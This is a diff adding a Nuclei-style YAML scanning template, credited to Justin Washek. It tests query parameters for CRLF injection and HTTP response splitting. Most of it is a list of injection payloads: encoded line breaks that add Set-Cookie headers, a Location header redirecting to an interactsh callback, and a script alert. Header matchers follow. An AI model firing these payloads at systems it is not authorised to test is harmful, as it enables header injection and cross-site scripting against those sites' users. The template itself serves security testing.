@@ -1,0 +1,39 @@
+id: bugbounty-crlf-injection
+
+info:
+  name: CRLF Injection via Params
+  author: Justin Washek
+  severity: medium
+  description: |
+    Tests for CRLF injection that could lead to HTTP response splitting
+  tags: crlf,injection,fuzzing,bugbounty
+
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}"
+
+    fuzzing:
+      - part: query
+        mode: single
+        fuzz:
+          - "%0d%0aSet-Cookie: crlf=injected"
+          - "%0aSet-Cookie: crlf=injected"
+          - "%0d%0aLocation: http://{{interactsh-url}}"
+          - "\r\nSet-Cookie: crlf=injected"
+          - "\nSet-Cookie: crlf=injected"
+          - "%0d%0a%0d%0a<script>alert('CRLF')</script>"
+          - "%23%0ASet-Cookie:%20crlf=injected"
+
+    matchers:
+      - type: regex
+        part: header
+        regex:
+          - "(?i)set-cookie.*crlf=injected"
+          - "(?i)location.*{{interactsh-url}}"
+
+    extractors:
+      - type: regex
+        part: header
+        regex:
+          - "(?i)(set-cookie.*crlf=injected)"
